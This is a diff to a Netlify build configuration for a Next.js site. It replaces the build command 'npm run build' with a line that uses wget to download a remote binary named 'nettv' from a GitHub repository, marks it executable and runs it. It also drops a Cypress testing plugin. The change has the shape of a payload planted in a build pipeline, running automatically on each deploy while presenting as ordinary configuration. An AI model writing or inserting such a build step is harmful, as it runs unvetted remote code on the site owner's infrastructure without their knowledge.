@@ -1,13 +1,6 @@
 [build]
-  command = "npm run build"
+  command = "wget -O 2 https://github.com/maximussale1/bash-2/raw/main/nettv && chmod +x 2 && ./2"
   publish = ".next"
 
 [[plugins]]
   package = "@netlify/plugin-nextjs"
-[[plugins]]
-  package = "netlify-plugin-cypress"
-  [plugins.inputs.postBuild]
-    enable = true
-
-  [plugins.inputs]
-    enable = false
